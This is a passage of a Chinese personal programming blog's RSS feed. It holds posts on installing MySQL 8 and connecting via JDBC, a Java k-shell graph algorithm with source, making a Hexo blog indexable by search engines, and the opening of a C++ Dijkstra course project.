下载的时候选择第一个，第二个是测试版。&lt;strong>坑：在你点击下载之后会教你login一类的，你可以忽略它们找到下面一排英文“No thanks,just start my download”就可以正式下载&lt;/strong>&lt;/p>
&lt;p>下载完成之后解压，将这个文件夹放到你想要的位置，列如E盘下。接着根据你选择的位置配置环境变量。如：&lt;/p>
&lt;pre tabindex="0">&lt;code>E:\mysql-8.0.13-winx64\bin
&lt;/code>&lt;/pre>&lt;p>&lt;a href="https://jingyan.baidu.com/article/00a07f3876cd0582d128dc55.html">不会配置环境变量？？？&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果你是用可执行安装包安装，即msi文件安装请参照&lt;a href="https://blog.csdn.net/CSDN_Liang_1991/article/details/81035293">这个&lt;/a>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="配置">配置&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>进入myql的安装目录（就是你放加压后文件夹的地方）,找到里面的bin文件夹。&lt;/p>
&lt;p>在该文件夹下点击窗体左上方文件 -&amp;gt; 找到“打开powershell” -&amp;gt; 选择“以管理员身份打开powershell” -&amp;gt; 运行如下命令&lt;/p>
&lt;pre tabindex="0">&lt;code>mysqld --initialize-insecure --console
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;p>--initialize-insecure参数是为了初始化一个没有初始密码的数据库&lt;/p>
&lt;/li>
&lt;li>
&lt;p>--console参数显示初始化结果，方便出现问题后应对。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果你初始化失败，请把错误信息给你想要请教的人看，而不是直接告诉别人你安装不了，掌握问问题的方法也很关键。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>坑：出现缺少XXX140.dll，请安装&lt;a href="https://www.microsoft.com/zh-CN/download/details.aspx?id=48145">这个&lt;/a>&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>类似问题安装c++运行库解决&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>坑：初始化提示无法读写文件，创建文件问题。确保你是管理员权限的命令行&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>坑：初始化失败，可以尝试删除mysql安装文件夹下的data文件夹重试&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>你也可以使用这个命令初始化mysql&lt;/p>
&lt;pre tabindex="0">&lt;code>mysqld --initialize --console
&lt;/code>&lt;/pre>&lt;p>这个命令在初始化过程中（如果成功）会输出一个随机密码，请务必记住他，否则你就得尝试重置密码了。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;p>安装服务&lt;/p>
&lt;p>在上一步执行没有报错之后，继续输入&lt;/p>
&lt;pre tabindex="0">&lt;code>mysqld install
&lt;/code>&lt;/pre>&lt;p>安装mysql的系统服务，&lt;strong>再次重申，请确保你的命令行具有管理员权限！！！&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>启动服务&lt;/p>
&lt;pre tabindex="0">&lt;code>net start mysql
&lt;/code>&lt;/pre>&lt;p>&lt;strong>坑:提示启动失败请尝试删除mysql服务&lt;/strong>
&lt;code>mysqld remove&lt;/code>
并回到第一步重新初始化（这个过程中可能还需要删除mysql安装目录中的data文件夹）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>第一次启动数据库修改密码&lt;/p>
&lt;ul>
&lt;li>
&lt;p>如果你是使用了--initialize-insecure参数初始化的数据库的话，那么数据库默认没有密码，直接在命令行输入&lt;/p>
&lt;pre tabindex="0">&lt;code>mysql -u root -p
&lt;/code>&lt;/pre>&lt;p>出现输入密码提示后按下回车即可。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>使用--initialize参数初始化的请输入初始化过程中输出的随机密码&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>修改密码&lt;/p>
&lt;pre tabindex="0">&lt;code>ALTER user &amp;#39;root&amp;#39;@&amp;#39;local&amp;#39; IDENTIFIED BY &amp;#39;your_password你的密码&amp;#39;;
&lt;/code>&lt;/pre>&lt;p>&lt;strong>坑:数据库命令大小写其实无所谓，可以都是小写。别忘了末尾的分号&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>数据库的基本操作:&lt;/p>
&lt;ul>
&lt;li>新建数据库&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>create database 你要新建的数据库的名字;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>展示所有数据库&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>show databases;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>切换数据库&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>use 你要切换的数据库的名字
&lt;/code>&lt;/pre>&lt;p>&lt;strong>坑:这里有没有分号无所谓，其他数据库语句必须分号结尾&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>新建表&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>create table 表名(key1 key_type,key2 key_type,key3 key_type);
实例：
create table student(no VARCHAR(20,name VARCHAR(20),math INT,average DOUBLE);
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>展示表中所有数据：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>select * from 表名;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>打印表内数据格式：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>desc 表名;
&lt;/code>&lt;/pre>&lt;p>&lt;a href="http://www.runoob.com/mysql/mysql-tutorial.html">更多命令&lt;/a>&lt;/p>
&lt;p>&lt;strong>坑:&lt;a href="https://www.shadowwu.club/2018/05/14/mysql_data_type/index.html">数值类型详解&lt;/a>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>坑:请先切换到你要创建表的数据库再执行创建表明操作&lt;/strong>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="java连接数据库">java连接数据库&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>在mysql官网下载mysql connector的java sdk.请按照你的数据库版本下载对应的connector &lt;a href="https://dev.mysql.com/downloads/connector/j/">下载地址&lt;/a>&lt;/p>
&lt;p>“Select Operating System”选项请选择“Platform Independent”.&lt;/p>
&lt;p>下载第一个还是第二个只是压缩包格式的不同&lt;/p>
&lt;p>下载点击进去之后请点击“No thanks, just start my download.”开始下载&lt;/p>
&lt;/li>
&lt;li>
&lt;p>下载完成之后解压，打开解压后的文件夹，找到一个*.jar后缀的文件列如：&lt;/p>
&lt;pre tabindex="0">&lt;code>mysql-connector-java-8.0.13.jar
&lt;/code>&lt;/pre>&lt;p>将该文件复制到你的eclipse中的java项目里&lt;/p>
&lt;p>&lt;strong>坑:什么你不知道你的eclipse项目目录在哪里？？？默认就在c:\用户\你的用户名\eclise-workplace里，对，打开哪个文件夹，找到你写的那个项目的名字，把这个jar文件放进去！！！&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>将jar文件加入你的java项目&lt;/p>
&lt;p>在eclipse里右键你写的项目，选择new-&amp;gt;选择Sourse Folder，随便起个名字你开心就好-&amp;gt;把你的那个jar文件再放进去（别问我怎么放，打开你的电脑）
&lt;a href="https://jingyan.baidu.com/article/ca41422fc76c4a1eae99ed9f.html">百度知道图解（百度知道没有选择创建source folder文件夹，我建议你这里选择这个）&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>书本范例代码的问题&lt;/p>
&lt;ul>
&lt;li>新版的mysql数据库connector驱动包全名：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>com.mysql.cj.jdbc.Driver
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>数据库连接url格式：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>jdbc:mysql://localhost:3306/数据库名称?serverTimezone=UTC
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>坑:mysql8.0.x新版在java调用时要增加参数化serverTimezone=UTC，设置数据库时间为世界标准时间，否则会报以下错误&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code> Caused by: java.sql.SQLException: The server time zone value &amp;#39;�й���׼ʱ��&amp;#39; is unrecognized or represents more than one time zone. You must configure either the server or JDBC driver (via the serverTimezone configuration property) to use a more specifc time zone value if you want to utilize time zone support.
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>连接数据库出现access deny字样&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>DriverManger.getConnection(DB_URL,USER,PASS)
&lt;/code>&lt;/pre>&lt;p>DB_URL就是上面提到的url格式内容。&lt;/p>
&lt;p>USER默认&amp;quot;root&amp;quot;,PASS如果为空则使用空字符串即可，有密码请确保密码正确&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="数据库连接代码示例">数据库连接代码示例&lt;/h2>
&lt;h3 id="请确保已经将mysqlconnector加入项目构建目录参照将jar文件加入你的java项目将jar文件加入你的java项目">请确保已经将mysqlconnector加入项目构建目录，参照&lt;a href="https://yuukisama.cc/posts/code/mysql8%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8Ajdbc%E4%BD%BF%E7%94%A8/#%E5%B0%86jar%E6%96%87%E4%BB%B6%E5%8A%A0%E5%85%A5%E4%BD%A0%E7%9A%84java%E9%A1%B9%E7%9B%AE">将jar文件加入你的java项目&lt;/a>&lt;/h3>
&lt;pre tabindex="0">&lt;code>public class MySQLDemo {
// JDBC 驱动名及数据库 URL
static final String JDBC_DRIVER = &amp;#34;com.mysql.cj.jdbc.Driver&amp;#34;;
static final String DB_URL = &amp;#34;jdbc:mysql://localhost:3306/RUNOOB&amp;#34;;//RUNOOB为数据库（database）名称
// 数据库的用户名与密码，需要根据自己的设置
static final String USER = &amp;#34;root&amp;#34;;
static final String PASS = &amp;#34;123456&amp;#34;;
public static void main(String[] args) {
Connection conn = null;
Statement stmt = null;
try{
// 注册 JDBC 驱动
Class.forName(&amp;#34;com.mysql.cj.jdbc.Driver&amp;#34;);
// 打开链接
System.out.println(&amp;#34;连接数据库...&amp;#34;);
conn = DriverManager.getConnection(DB_URL,USER,PASS);
// 执行查询
System.out.println(&amp;#34; 实例化Statement对象...&amp;#34;);
stmt = conn.createStatement();
String sql;
sql = &amp;#34;SELECT id, name, url FROM websites&amp;#34;;//构建sql语句 id name url均为字段名 websites表名
ResultSet rs = stmt.executeQuery(sql);//执行sql语句并获取返回结果
// 展开结果集数据库
while(rs.next()){
// 通过字段检索
int id = rs.getInt(&amp;#34;id&amp;#34;);
String name = rs.getString(&amp;#34;name&amp;#34;);
String url = rs.getString(&amp;#34;url&amp;#34;);
// 输出数据
System.out.print(&amp;#34;ID: &amp;#34; + id);
System.out.print(&amp;#34;, 站点名称: &amp;#34; + name);
System.out.print(&amp;#34;, 站点 URL: &amp;#34; + url);
System.out.print(&amp;#34;\n&amp;#34;);
}
// 完成后关闭
rs.close();
stmt.close();
conn.close();
}catch(SQLException se){
// 处理 JDBC 错误
se.printStackTrace();
}catch(Exception e){
// 处理 Class.forName 错误
e.printStackTrace();
}finally{
// 关闭资源
try{
if(stmt!=null) stmt.close();
}catch(SQLException se2){
}// 什么都不做
try{
if(conn!=null) conn.close();
}catch(SQLException se){
se.printStackTrace();
}
}
System.out.println(&amp;#34;Goodbye!&amp;#34;);
}
}
&lt;/code>&lt;/pre></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</category></item><item><title>k-shell算法Java实现</title><link>https://yuukisama.cc/posts/code/k-shell%E7%AE%97%E6%B3%95java%E5%AE%9E%E7%8E%B0/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/k-shell%E7%AE%97%E6%B3%95java%E5%AE%9E%E7%8E%B0/</guid><pubDate>Fri, 28 Dec 2018 15:06:28 +0000</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h2 id="摘要">摘要&lt;/h2>
&lt;ul>
&lt;li>本文章是基于个人对k-shell算法的理解，若有偏颇还望指正。&lt;/li>
&lt;li>基于java实现的k-shell算法，文末附源码，仅供学习。&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="xiaoling.jpg" alt="">&lt;/p>
&lt;h2 id="k-shell算法">k-shell算法&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>从数据结构图中逐步删除节点权值小于某阈值的节点以及其相关路径的算法&lt;/p>
&lt;/li>
&lt;li>
&lt;p>K-shell 方法递归地剥离网络中度数小于或等于 k 的节点,具体划分过程如下: 假设网络中不存在度数为 0 的孤立节点。从度指标的角度分析,度数为 1的节点是网络中最不重要的节点,因此首先将度数为 1 的节点及其连边从网络中删除。删除操作进行之后的网络中会出现新的度数为 1 的节点,接着将这些新出现的度数为 1 的节点及其连边删除。重复上述操作,直到网络中不再新出现度数为 1的节点为止。此时所有被删除的节点构成第一层,即 1-shell,节点的 Ks 值等于 1。剩下的网络中,每个节点的度数至少为2。继续重复上述删除操作,得到 Ks 值等于 2 的第二层,即 2-shell。依此类推,直到网络中所有的节点都被赋予 Ks 值。
&lt;a href="https://blog.csdn.net/DreamHome_S/article/details/78830943">出处&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>关于k-shell算法的一些小问题，目前为止本人未能找到足够官方的文章讲解。若有人能指正，感激不尽。&lt;/p>
&lt;p>节点的度在图的定义中可以理解为节点与其他节点的路径数目。在我们删除对应度数节点的过程中势必会又节点度数更大的节点变为度数小的节点。这样节点的度数就会改变，对于这种改变发生而产生的低于当前处理度数k的新节点又应该怎样处理？&lt;/p>
&lt;p>本代码对这类节点，这个代码处理时在删除当前所有节点度数小于等于ks值的节点，并把删除节点加入ks值。针对此次提供的数据ks层数最大值为12。实验数据以及实验结果将会附在源代码末尾&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="数据结构安排">数据结构安排&lt;/h2>
&lt;p>&lt;strong>以下代码使用vscode+java环境编写&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>因为是使用的java语言。这里用一个hashmap来存储图。hashmap中key，value分别为string，以及hashset。
key值中存储图节点，对应value（hashset型）存储与该节点有连接的节点。&lt;/p>
&lt;pre tabindex="0">&lt;code>HashMap&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt; map=new HashMap&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;();
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>用另一个hashmap来存储对应k值的网络层,key值用来存放k值，value的hashset里面存放从网络中剔除的节点。&lt;/p>
&lt;pre tabindex="0">&lt;code>HashMap&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt; kmap=new HashMap&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt;();
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>首先第一步从文件中读取数据,这里操作时按行读取。&lt;a href="https://blog.csdn.net/brushli/article/details/12356695">java文件操作&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>private static void loadfile(String filename){
map.clear(); //将图清空重置
try {
File f=new File(filename); //尝试打开文件
FileInputStream fstream=new FileInputStream(f);
InputStreamReader ireader=new InputStreamReader(fstream);
BufferedReader breader=new BufferedReader(ireader);
String line=&amp;#34;&amp;#34;; //存储每一行的数据
String a=&amp;#34;&amp;#34;; //存储逗号左边
String b=&amp;#34;&amp;#34;; //存储逗号右边
String[] points;//存储行数据分割之后的内容
HashSet&amp;lt;String&amp;gt; temp=null;
while ((line=breader.readLine())!=null){
points=line.split(&amp;#34;,&amp;#34;); //以逗号分割字符串
a=points[0];
b=points[1];
temp=map.get(a);
if (temp!=null){ //这里的读取操作有点绕
temp.add(b); //将逗号前面的节点当作key值在map中检索，如果存在对应的value
} //就把逗号后面的节点存入这个key值所对应的value中
else{ //如果不存在，证明map中还没有这个节点的信息。
temp=new HashSet&amp;lt;String&amp;gt;();
temp.add(b); //则将逗号前面的节点作为key
map.put(a, temp); //逗号后面的节点作为value中的元素存入map中
}
temp=map.get(b); //这里将逗号前后对换位置重复一遍，保证map的key值中包含所有的节点
if (temp!=null){
temp.add(a);
}
else{
temp=new HashSet&amp;lt;String&amp;gt;();
temp.add(a);
map.put(b, temp);
}
}
breader.close();
} catch (Exception e) {
//TODO: handle exception
e.printStackTrace();
}
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>为了方便查看图的变化这里写了一个map的打印函数：&lt;/p>
&lt;pre tabindex="0">&lt;code>private static void mapprint(){
Iterator iter=map.entrySet().iterator();
while (iter.hasNext()){
Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt; entry=(Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
System.out.println(entry.getKey()+&amp;#34; &amp;#34;+entry.getValue().toString());
}
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>以及存储对应k值剥离出来的网络节点的打印函数&lt;/p>
&lt;pre tabindex="0">&lt;code>private static void printkmap(){
Iterator iter=kmap.entrySet().iterator();
while(iter.hasNext()){
Map.Entry&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt; entry=(Map.Entry&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
System.out.println(entry.getKey().toString()+&amp;#34; &amp;#34;+entry.getValue().toString());
}
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>k-shell算法。&lt;/p>
&lt;ul>
&lt;li>以图（hashmap为空为终止条件）为空为终止条件的循环。每次删除节点权值小于k的节点以及相应路径，在图（hashmap）一轮遍历完成之后k值+1。&lt;/li>
&lt;li>删除的时候要注意，这样的存储结构的设计模式，我们删除一个节点时，要同时把该节点从其他与该节点相连接的节点的value中删除。因此这里的删除函数显得很复杂。&lt;/li>
&lt;/ul>
&lt;p>&lt;a href="https://www.cnblogs.com/zhangnf/p/HashMap.html">Hashmap的遍历删除操作&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>private static void kshell_func(){
int k=1;
kmap.clear();
while (!map.isEmpty()){
HashSet&amp;lt;String&amp;gt; ktemp=new HashSet&amp;lt;String&amp;gt;();
for (Iterator&amp;lt;Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;&amp;gt; iter = map.entrySet().iterator(); iter.hasNext();){
Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt; item = iter.next();
if (item.getValue().size()&amp;lt;=k){
ktemp.add(item.getKey())
for (String i:item.getValue()){
HashSet&amp;lt;String&amp;gt; temp=map.get(i);
temp.remove(item.getKey());
}
iter.remove();
}
}
// Iterator iter=map.entrySet().iterator();
// Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt; entry=(Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
// while (iter.hasNext()){
// if (entry.getValue().size()&amp;lt;=k){
// ktemp.add(entry.getKey());
// for (String index:entry.getValue()){
// HashSet&amp;lt;String&amp;gt; temp=map.get(index);
// temp.remove(entry.getKey());
// }
// String keytemp=entry.getKey();
// entry=(Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
// map.remove(keytemp);
// System.out.println(&amp;#34;delete ...&amp;#34;);
// }
// }
kmap.put(Integer.valueOf(k),ktemp);
k=k+1;
}
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="源码">源码&lt;/h2>
&lt;p>&lt;a href="data.txt">数据文件&lt;/a>&lt;/p>
&lt;p>&lt;a href="result.txt">结果文件&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Map;
import java.lang.Integer;
public class kshell{
private static HashMap&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt; map=new HashMap&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;();
private static HashMap&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt; kmap=new HashMap&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt;();
private static void loadfile(String filename){
map.clear();
try {
File f=new File(filename);
FileInputStream fstream=new FileInputStream(f);
InputStreamReader ireader=new InputStreamReader(fstream);
BufferedReader breader=new BufferedReader(ireader);
String line=&amp;#34;&amp;#34;;
String a=&amp;#34;&amp;#34;;
String b=&amp;#34;&amp;#34;;
String[] points;
HashSet&amp;lt;String&amp;gt; temp=null;
while ((line=breader.readLine())!=null){
points=line.split(&amp;#34;,&amp;#34;);
a=points[0];
b=points[1];
temp=map.get(a);
if (temp!=null){
temp.add(b);
}
else{
temp=new HashSet&amp;lt;String&amp;gt;();
temp.add(b);
map.put(a, temp);
}
temp=map.get(b);
if (temp!=null){
temp.add(a);
}
else{
temp=new HashSet&amp;lt;String&amp;gt;();
temp.add(a);
map.put(b, temp);
}
}
breader.close();
} catch (Exception e) {
//TODO: handle exception
e.printStackTrace();
}
}
private static void mapprint(){
Iterator iter=map.entrySet().iterator();
while (iter.hasNext()){
Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt; entry=(Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
System.out.println(entry.getKey()+&amp;#34; &amp;#34;+entry.getValue().toString());
}
}
private static void kshell_func(){
int k=1;
kmap.clear();
while (!map.isEmpty()){
HashSet&amp;lt;String&amp;gt; ktemp=new HashSet&amp;lt;String&amp;gt;();
for (Iterator&amp;lt;Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;&amp;gt; iter = map.entrySet().iterator(); iter.hasNext();){
Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt; item = iter.next();
if (item.getValue().size()&amp;lt;=k){
ktemp.add(item.getKey())
for (String i:item.getValue()){
HashSet&amp;lt;String&amp;gt; temp=map.get(i);
temp.remove(item.getKey());
}
iter.remove();
}
}
// Iterator iter=map.entrySet().iterator();
// Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt; entry=(Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
// while (iter.hasNext()){
// if (entry.getValue().size()&amp;lt;=k){
// ktemp.add(entry.getKey());
// for (String index:entry.getValue()){
// HashSet&amp;lt;String&amp;gt; temp=map.get(index);
// temp.remove(entry.getKey());
// }
// String keytemp=entry.getKey();
// entry=(Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
// map.remove(keytemp);
// System.out.println(&amp;#34;delete ...&amp;#34;);
// }
// }
kmap.put(Integer.valueOf(k),ktemp);
k=k+1;
}
}
private static void printkmap(){
Iterator iter=kmap.entrySet().iterator();
while(iter.hasNext()){
Map.Entry&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt; entry=(Map.Entry&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
System.out.println(entry.getKey().toString()+&amp;#34; &amp;#34;+entry.getValue().toString());
}
}
public static void main(String[] args) {
loadfile(&amp;#34;./data.txt&amp;#34;);
//mapprint();
kshell_func();
//mapprint();
printkmap();
System.out.println(&amp;#34;complete&amp;#34;);
}
}
&lt;/code>&lt;/pre></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/%E7%AE%97%E6%B3%95/">算法</category><category domain="https://yuukisama.cc/tags/%E8%B1%A1%E7%89%99%E5%A1%94/">象牙塔</category></item><item><title>Blog搜索引擎可发现</title><link>https://yuukisama.cc/posts/code/%E5%B0%8F%E7%AB%99%E6%88%90%E9%95%BF-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%AF%E5%8F%91%E7%8E%B0/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/%E5%B0%8F%E7%AB%99%E6%88%90%E9%95%BF-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%AF%E5%8F%91%E7%8E%B0/</guid><pubDate>Thu, 27 Dec 2018 23:53:12 +0000</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h2 id="摘要">摘要&lt;/h2>
&lt;ul>
&lt;li>本文介绍了如何让搜索引擎可以搜索本站，小站成长的一步~&lt;/li>
&lt;li>搜索引擎检索至少需要你的网站有域名（不建议没有域名）因此国内就需要进行备案等等一系列的操作，如果尚未备案的可以完成备案之后再尝试。&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="baidu.jpg" alt="谷歌娘">&lt;/p>
&lt;h2 id="建立站点地图">建立站点地图&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>在本地博客文件夹路径内运行代码如下，安装站点地图生成插件:&lt;/p>
&lt;pre tabindex="0">&lt;code>npm install hexo-generator-sitemap --save
npm install hexo-generator-baidu-sitemap --save
&lt;/code>&lt;/pre>&lt;p>分别安装hexo站点地图生成插件，对应的分别是百度的站点地图生成以及Google粑粑的站点地图。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>构建网站，检查在public文件夹中是否产生sitemap.xml，baidusitemap.xml。存在表明站地图生成成功。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>在source文件夹下新建robots.txt文件 &lt;a href="https://baike.baidu.com/item/robot.txt">什么是robots.txt&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>User-agent: *
Sitemap: http://aleonchen.com/sitemap.xml
Sitemap: http://aleonchen.com/baidusitemap.xml
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>重新构架并发布你的网站&lt;/p>
&lt;pre tabindex="0">&lt;code>hexo g -d
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;h2 id="向搜索引擎注册你的网站">向搜索引擎注册你的网站&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>备注：这里使用html的认证方法&lt;/p>
&lt;p>&lt;a href="https://www.google.com/webmasters/tools/home?hl=zh-CN">Google 提交入口&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://ziyuan.baidu.com/linksubmit/url">百度提交入口&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>下载搜索引擎提供的html文件&lt;/li>
&lt;li>添加到博客下的source文件夹内&lt;/li>
&lt;li>构建发布之后在搜索引擎提交入口完成认证,等待搜索引擎完成数据更新之后即可在搜索引擎中找到你的站点。&lt;/li>
&lt;/ol>
&lt;h2 id="坑">&lt;strong>坑：&lt;/strong>&lt;/h2>
&lt;p>直接这样加入source里构建并发布会会导致在访问这个html文件的时候被hexo本身重定向。如果你出现了重定向问题，请参照如下方式:&lt;/p>
&lt;p>在source文件夹下搜索引擎提供的html首部加入:&lt;/p>
&lt;pre tabindex="0">&lt;code>layout: false
---
&lt;/code>&lt;/pre>&lt;p>这样可以标识hexo停用ta的渲染，就不会重定向了.&lt;/p>
&lt;p>之后重新构建发布网站即可&lt;/p></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/">网站搭建</category></item><item><title>Dijkstra算法课设</title><link>https://yuukisama.cc/posts/code/dijkstra%E7%AE%97%E6%B3%95%E8%AF%BE%E8%AE%BE/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/dijkstra%E7%AE%97%E6%B3%95%E8%AF%BE%E8%AE%BE/</guid><pubDate>Thu, 27 Dec 2018 18:35:23 +0000</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;blockquote>
&lt;h2 id="dijkstra算法课设">Dijkstra算法课设&lt;/h2>
&lt;/blockquote>
&lt;p>数据结构课程中的经典算法。我会将一些程序系统设计过程中的一些小细节问题（暂且称之为小细节把，因为我也不知道拿什么次比较准确），并在最后附上程序所有源码。作为一个曾经的苟若的算法狗（现在依旧小垃圾）,很多数据结构在实现的时候没必要照抄《数据结构》书上那套迂腐的东西，那终究是伪代码，而且反人类&lt;del>当然如果你就是十分喜欢结构体的使用的话不拦着你&lt;/del>。&lt;/p>
&lt;p>&lt;img src="miao.jpg" alt="">&lt;/p>
&lt;p>&lt;strong>很多东西是编程的一些编程习惯，多敲，多理解，遇到bug不要第一件事情是想着找别人问。程序员需要的是自己解决问题的能力（当然也不是一味的钻牛角尖，这就是中庸的事情了）&lt;/strong>
&lt;del>我的某个好友问我你看到程序报错的第一反应是什么，ta的回答是问老师，我是真的无话可讲了&lt;/del>&lt;/p>
&lt;h2 id="以下代码基于c">&lt;strong>以下代码基于c++&lt;/strong>&lt;/h2>
&lt;h2 id="课设要求">课设要求&lt;/h2>
&lt;ol>
&lt;li>结点数可改变(可增加或删除城市及相关弧)&lt;/li>
&lt;li>弧的权值可改变(输入有弧的两个城市名称，修改相应权值)&lt;/li>
&lt;li>源点固定，输入不同终点时，能输出最短路径长度及路径(以城市名称表示)&lt;/li>
&lt;li>初始图至少包括6个城市&lt;/li>
&lt;li>设计简单菜单能进行操作选择&lt;/li>
&lt;/ol>
